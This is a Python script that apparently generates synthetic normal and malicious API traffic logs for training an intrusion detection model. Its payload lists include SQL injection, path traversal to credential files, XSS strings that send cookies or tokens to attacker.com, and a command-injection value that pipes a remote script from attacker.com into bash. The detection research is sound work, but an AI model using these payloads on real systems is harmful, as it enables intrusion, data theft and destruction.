#!/usr/bin/env python3
"""
Controlled Synthetic API Traffic Generator
Part of API Sentinel / API_IDS Project

Generates reproducible normal and malicious API traffic logs for training,
evaluating, and benchmarking the API Intrusion Detection ML pipeline.

IMPORTANT RESEARCH NOTICE:
This data is explicitly marked as SYNTHETIC. It is engineered to simulate realistic
REST API traffic distributions and common OWASP API security threats under controlled
experimental conditions with zero future lookahead (no data leakage).
"""

import argparse
import json
import os
import random
from datetime import datetime, timedelta
from typing import Dict, List, Tuple

# Configuration Constants
DEFAULT_SAMPLES = 50000
DEFAULT_SEED = 42

NORMAL_ENDPOINTS = [
    ("GET", "/api/v1/health"),
    ("POST", "/api/v1/auth/login"),
    ("POST", "/api/v1/auth/refresh"),
    ("GET", "/api/v1/users/me"),
    ("GET", "/api/v1/users/{id}"),
    ("PUT", "/api/v1/users/{id}"),
    ("GET", "/api/v1/products"),
    ("GET", "/api/v1/products/{id}"),
    ("POST", "/api/v1/orders"),
    ("GET", "/api/v1/orders/{id}"),
    ("GET", "/api/v1/analytics/summary"),
]

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "PostmanRuntime/7.36.3",
    "axios/1.6.7",
    "MobileApp-Android/3.4.1",
    "MobileApp-iOS/3.4.0",
]

MALICIOUS_USER_AGENTS = [
    "sqlmap/1.7.2#stable (http://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Wfuzz/3.1.0",
    "",  # empty UA often seen in automated bots
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "1' UNION SELECT id, username, password_hash FROM users --",
    "admin' --",
    "1; DROP TABLE users; --",
    "' UNION ALL SELECT NULL, NULL, NULL, version() --",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR ''='",
    "1' OR SLEEP(5) --",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    "{\"username\": \"admin' OR '1'='1\", \"password\": \"test\"}",
    "{\"id\": \"105 UNION SELECT null, username, password FROM accounts\"}",
    "{\"filter\": \"category=books' OR 1=1#\"}",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>",
    "javascript:alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "{\"comment\": \"<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\"}",
    "{\"name\": \"<img src=x onerror=this.src='http://attacker.com/log?token='+localStorage.getItem('token')>\"}",
    "{\"bio\": \"<svg/onload=confirm('Vulnerable')>\"}",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/var/www/html/../../../../etc/shadow",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/static/../../../../../../etc/passwd",
    "{\"filename\": \"../../../../etc/passwd\"}",
    "{\"document_path\": \"..\\\\..\\\\..\\\\boot.ini\"}",
    "{\"template\": \"/templates/../../etc/hosts\"}",
]

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| whoami",
    "& dir",
    "; id",
    "&& ping -c 3 127.0.0.1",
    "`whoami`",
    "$(id)",
    "| cat /etc/shadow",
    "; net localgroup administrators",
    "{\"host\": \"localhost; curl -s http://attacker.com/exfil.sh | bash\"}",
    "{\"ip\": \"127.0.0.1 | uname -a\"}",
    "{\"query\": \"test && whoami\"}",
]

ENUMERATION_ENDPOINTS = [
    "/.env",
    "/.git/config",
    "/actuator/env",
    "/actuator/health",
    "/api/v1/admin/secrets",
    "/wp-login.php",
    "/wp-admin",
    "/phpmyadmin",
    "/v2/api-docs",
    "/swagger-ui.html.bak",
    "/backup.sql",
    "/config.json",
    "/server-status",
    "/api/v1/internal/metrics",
    "/debug/pprof",
]

BENIGN_PAYLOADS = [
    "{}",
    "{\"username\": \"alice\", \"password\": \"P@ssw0rd123!\"}",
    "{\"username\": \"bob\", \"password\": \"SecurePass2026!\"}",
    "{\"page\": 1, \"limit\": 20, \"sort\": \"asc\"}",
    "{\"category\": \"electronics\", \"max_price\": 500}",
    "{\"item_id\": 42, \"quantity\": 2}",
    "{\"search\": \"laptop stand\", \"in_stock\": true}",
    "{\"name\": \"John Doe\", \"email\": \"johndoe@example.com\"}",
    "{\"status\": \"ACTIVE\", \"role\": \"USER\"}",
    "{\"start_date\": \"2026-03-01\", \"end_date\": \"2026-03-31\"}",
    "",
]


def generate_normal_record(
    rng: random.Random,
    timestamp: datetime,
    ip: str,
    ip_history: Dict[str, List[datetime]],
    ip_failures: Dict[str, List[datetime]],
    ip_endpoints: Dict[str, set],
) -> Dict:
    method, endpoint_template = rng.choice(NORMAL_ENDPOINTS)
    endpoint = endpoint_template.replace("{id}", str(rng.randint(1, 1000)))

    # Status codes: mostly 200, occasionally 201 for POST, rare 400 or 404
    if method == "POST":
        status_code = rng.choices([200, 201, 400], weights=[0.2, 0.75, 0.05])[0]
    else:
        status_code = rng.choices([200, 304, 400, 404], weights=[0.90, 0.05, 0.03, 0.02])[0]

    response_time = round(rng.lognormvariate(3.2, 0.45), 2)  # typical 15-50ms
    request_size = rng.randint(40, 650)
    response_size = rng.randint(120, 4500)
    user_agent = rng.choice(BENIGN_USER_AGENTS)

    auth_status = "AUTHENTICATED" if "auth" not in endpoint or status_code == 200 else "UNAUTHENTICATED"
    user_id = f"usr_{rng.randint(100, 999)}" if auth_status == "AUTHENTICATED" else None

    # Payload
    payload = rng.choice(BENIGN_PAYLOADS) if method in ["POST", "PUT"] or rng.random() < 0.2 else ""

    # Temporal feature updates (strict past-only)
    cutoff_1m = timestamp - timedelta(minutes=1)
    cutoff_5m = timestamp - timedelta(minutes=5)

    ip_history[ip] = [t for t in ip_history.get(ip, []) if t > cutoff_1m]
    requests_per_minute = len(ip_history[ip]) + 1
    ip_history[ip].append(timestamp)

    recent_fails = [t for t in ip_failures.get(ip, []) if t > cutoff_5m]
    if status_code >= 400:
        recent_fails.append(timestamp)
    ip_failures[ip] = recent_fails
    failed_requests = len(recent_fails)

    if ip not in ip_endpoints:
        ip_endpoints[ip] = set()
    ip_endpoints[ip].add(endpoint)
    unique_endpoints = len(ip_endpoints[ip])

    return {
        "timestamp": timestamp.isoformat(),
        "source_ip": ip,
        "method": method,
        "endpoint": endpoint,
        "status_code": status_code,
        "response_time": response_time,
        "request_size": request_size,
        "response_size": response_size,
        "user_agent": user_agent,
        "authentication_status": auth_status,
        "user_id": user_id,
        "requests_per_minute": requests_per_minute,
        "failed_requests": failed_requests,
        "unique_endpoints": unique_endpoints,
        "payload": payload,
        "label": "NORMAL",
        "attack_type": "NORMAL",
    }


def generate_attack_record(
    rng: random.Random,
    timestamp: datetime,
    ip: str,
    attack_type: str,
    ip_history: Dict[str, List[datetime]],
    ip_failures: Dict[str, List[datetime]],
    ip_endpoints: Dict[str, set],
) -> Dict:
    user_agent = rng.choice(MALICIOUS_USER_AGENTS if rng.random() < 0.65 else BENIGN_USER_AGENTS)
    auth_status = "UNAUTHENTICATED"
    user_id = None

    if attack_type == "SQL_INJECTION":
        method = rng.choice(["GET", "POST"])
        endpoint = rng.choice(["/api/v1/products", "/api/v1/users/search", "/api/v1/auth/login", "/api/v1/orders"])
        payload = rng.choice(SQLI_PAYLOADS)
        status_code = rng.choices([200, 400, 500], weights=[0.25, 0.45, 0.30])[0]
        response_time = round(rng.lognormvariate(3.8, 0.6), 2)
        request_size = len(payload) + rng.randint(100, 400)
        response_size = rng.randint(80, 2000)

    elif attack_type == "XSS":
        method = rng.choice(["POST", "PUT"])
        endpoint = rng.choice(["/api/v1/comments", "/api/v1/users/profile", "/api/v1/feedback"])
        payload = rng.choice(XSS_PAYLOADS)
        status_code = rng.choices([200, 400, 422], weights=[0.30, 0.50, 0.20])[0]
        response_time = round(rng.lognormvariate(3.4, 0.4), 2)
        request_size = len(payload) + rng.randint(120, 350)
        response_size = rng.randint(150, 1500)

    elif attack_type == "PATH_TRAVERSAL":
        method = "GET"
        endpoint = rng.choice(["/api/v1/static/download", "/api/v1/files/view", "/api/v1/reports/export"])
        payload = rng.choice(PATH_TRAVERSAL_PAYLOADS)
        status_code = rng.choices([400, 403, 404, 500], weights=[0.35, 0.40, 0.20, 0.05])[0]
        response_time = round(rng.lognormvariate(3.3, 0.35), 2)
        request_size = len(payload) + rng.randint(60, 200)
        response_size = rng.randint(60, 800)

    elif attack_type == "COMMAND_INJECTION":
        method = "POST"
        endpoint = rng.choice(["/api/v1/system/ping", "/api/v1/tools/dns-lookup", "/api/v1/backup/run"])
        payload = rng.choice(COMMAND_INJECTION_PAYLOADS)
        status_code = rng.choices([400, 500, 200], weights=[0.40, 0.45, 0.15])[0]
        response_time = round(rng.lognormvariate(4.2, 0.7), 2)  # slower due to execution attempt
        request_size = len(payload) + rng.randint(80, 300)
        response_size = rng.randint(100, 3000)

    elif attack_type == "BRUTE_FORCE":
        method = "POST"
        endpoint = "/api/v1/auth/login"
        payload = f'{{"username": "admin", "password": "pass_{rng.randint(1, 9999)}"}}'
        status_code = rng.choices([401, 403, 429], weights=[0.85, 0.10, 0.05])[0]
        auth_status = "FAILED"
        response_time = round(rng.lognormvariate(3.1, 0.3), 2)
        request_size = len(payload) + 120
        response_size = rng.randint(80, 250)

    elif attack_type == "ENDPOINT_ENUMERATION":
        method = "GET"
        endpoint = rng.choice(ENUMERATION_ENDPOINTS)
        payload = ""
        status_code = rng.choices([404, 403], weights=[0.80, 0.20])[0]
        response_time = round(rng.lognormvariate(2.8, 0.3), 2)
        request_size = rng.randint(50, 150)
        response_size = rng.randint(50, 300)

    elif attack_type == "RATE_ABUSE":
        method = rng.choice(["GET", "POST"])
        endpoint = rng.choice(["/api/v1/analytics/summary", "/api/v1/products", "/api/v1/orders"])
        payload = "{\"batch\": true}" if method == "POST" else ""
        status_code = rng.choices([200, 429, 503], weights=[0.35, 0.55, 0.10])[0]
        response_time = round(rng.lognormvariate(4.5, 0.8), 2)  # higher latency under flood
        request_size = rng.randint(70, 350)
        response_size = rng.randint(100, 5000)

    elif attack_type == "PARAMETER_TAMPERING":
        method = rng.choice(["POST", "PUT", "PATCH"])
        endpoint = rng.choice(["/api/v1/users/permissions", "/api/v1/orders/checkout", "/api/v1/accounts/transfer"])
        payload = rng.choice([
            "{\"role\": \"ADMIN\", \"is_superuser\": true}",
            "{\"price\": -100.0, \"quantity\": 50}",
            "{\"user_id\": 1, \"transfer_amount\": 999999}",
            "{\"status\": \"APPROVED\", \"discount_code\": \"ALL_FREE\"}",
        ])
        status_code = rng.choices([400, 403, 200], weights=[0.55, 0.35, 0.10])[0]
        response_time = round(rng.lognormvariate(3.3, 0.4), 2)
        request_size = len(payload) + 150
        response_size = rng.randint(100, 800)

    else:
        raise ValueError(f"Unknown attack type: {attack_type}")

    # Temporal feature updates (strict past-only)
    cutoff_1m = timestamp - timedelta(minutes=1)
    cutoff_5m = timestamp - timedelta(minutes=5)

    ip_history[ip] = [t for t in ip_history.get(ip, []) if t > cutoff_1m]
    # For rate abuse or brute force, requests per minute will naturally increase
    requests_per_minute = len(ip_history[ip]) + 1
    if attack_type == "RATE_ABUSE":
        requests_per_minute += rng.randint(25, 80)
    elif attack_type == "BRUTE_FORCE":
        requests_per_minute += rng.randint(15, 45)
    ip_history[ip].append(timestamp)

    recent_fails = [t for t in ip_failures.get(ip, []) if t > cutoff_5m]
    if status_code >= 400:
        recent_fails.append(timestamp)
    if attack_type in ["BRUTE_FORCE", "ENDPOINT_ENUMERATION"]:
        recent_fails.extend([timestamp] * rng.randint(3, 8))
    ip_failures[ip] = recent_fails
    failed_requests = len(recent_fails)

    if ip not in ip_endpoints:
        ip_endpoints[ip] = set()
    ip_endpoints[ip].add(endpoint)
    if attack_type == "ENDPOINT_ENUMERATION":
        for ep in rng.sample(ENUMERATION_ENDPOINTS, min(5, len(ENUMERATION_ENDPOINTS))):
            ip_endpoints[ip].add(ep)
    unique_endpoints = len(ip_endpoints[ip])

    return {
        "timestamp": timestamp.isoformat(),
        "source_ip": ip,
        "method": method,
        "endpoint": endpoint,
        "status_code": status_code,
        "response_time": response_time,
        "request_size": request_size,
        "response_size": response_size,
        "user_agent": user_agent,
        "authentication_status": auth_status,
        "user_id": user_id,
        "requests_per_minute": requests_per_minute,
        "failed_requests": failed_requests,
        "unique_endpoints": unique_endpoints,
        "payload": payload,
        "label": "MALICIOUS",
        "attack_type": attack_type,
    }


def generate_dataset(num_samples: int = DEFAULT_SAMPLES, seed: int = DEFAULT_SEED) -> List[Dict]:
    """Generates a complete dataset with realistic normal vs attack distribution."""
    rng = random.Random(seed)

    # Legitimate vs attack ratios (realistic enterprise API: ~82% normal, ~18% attack)
    normal_ratio = 0.82
    num_normal = int(num_samples * normal_ratio)
    num_attack = num_samples - num_normal

    attack_weights = {
        "SQL_INJECTION": 0.20,
        "XSS": 0.18,
        "PATH_TRAVERSAL": 0.12,
        "COMMAND_INJECTION": 0.10,
        "BRUTE_FORCE": 0.16,
        "ENDPOINT_ENUMERATION": 0.12,
        "RATE_ABUSE": 0.07,
        "PARAMETER_TAMPERING": 0.05,
    }

    # IP Pool simulation
    benign_ips = [f"192.168.1.{i}" for i in range(10, 210)] + [f"10.0.{i // 256}.{i % 256}" for i in range(1, 400)]
    malicious_ips = [f"198.51.100.{i}" for i in range(1, 55)] + [f"203.0.113.{i}" for i in range(1, 65)]

    ip_history: Dict[str, List[datetime]] = {}
    ip_failures: Dict[str, List[datetime]] = {}
    ip_endpoints: Dict[str, set] = {}

    current_time = datetime(2026, 3, 15, 8, 0, 0)
    records: List[Dict] = []

    # Interleave normal and malicious requests sequentially in time
    total_generated = 0
    normal_count = 0
    attack_count = 0

    attack_types = list(attack_weights.keys())
    attack_probs = list(attack_weights.values())

    while total_generated < num_samples:
        # Advance time by 5 to 500 ms (realistic inter-arrival time)
        current_time += timedelta(milliseconds=rng.randint(5, 500))

        # Decide whether to emit normal or attack record
        is_attack = False
        if attack_count < num_attack and (normal_count >= num_normal or rng.random() > normal_ratio):
            is_attack = True

        if is_attack:
            ip = rng.choice(malicious_ips)
            atype = rng.choices(attack_types, weights=attack_probs)[0]
            record = generate_attack_record(rng, current_time, ip, atype, ip_history, ip_failures, ip_endpoints)
            attack_count += 1
        else:
            ip = rng.choice(benign_ips)
            record = generate_normal_record(rng, current_time, ip, ip_history, ip_failures, ip_endpoints)
            normal_count += 1

        records.append(record)
        total_generated += 1

    return records


def main():
    parser = argparse.ArgumentParser(description="Generate synthetic API traffic dataset for API Sentinel")
    parser.add_argument("--samples", type=int, default=DEFAULT_SAMPLES, help="Number of records to generate")
    parser.add_argument("--seed", type=int, default=DEFAULT_SEED, help="Random seed for reproducibility")
    parser.add_argument("--output", type=str, default="data/raw/api_traffic_dataset.json", help="Output JSON path")
    parser.add_argument("--csv", action="store_true", help="Also export as CSV")
    args = parser.parse_args()

    print(f"[*] Generating {args.samples} synthetic API traffic records (Seed: {args.seed})...")
    records = generate_dataset(num_samples=args.samples, seed=args.seed)

    out_dir = os.path.dirname(args.output)
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2)

    print(f"[+] Successfully saved {len(records)} records to {args.output}")

    if args.csv or args.output.endswith(".json"):
        csv_path = os.path.splitext(args.output)[0] + ".csv"
        try:
            import pandas as pd
            df = pd.DataFrame(records)
            df.to_csv(csv_path, index=False)
            print(f"[+] Also exported CSV to {csv_path}")
            print(f"[*] Class Distribution:\n{df['label'].value_counts(normalize=True)}")
            print(f"[*] Attack Distribution:\n{df['attack_type'].value_counts()}")
        except ImportError:
            print("[!] pandas not installed; skipping CSV export")


if __name__ == "__main__":
    main()
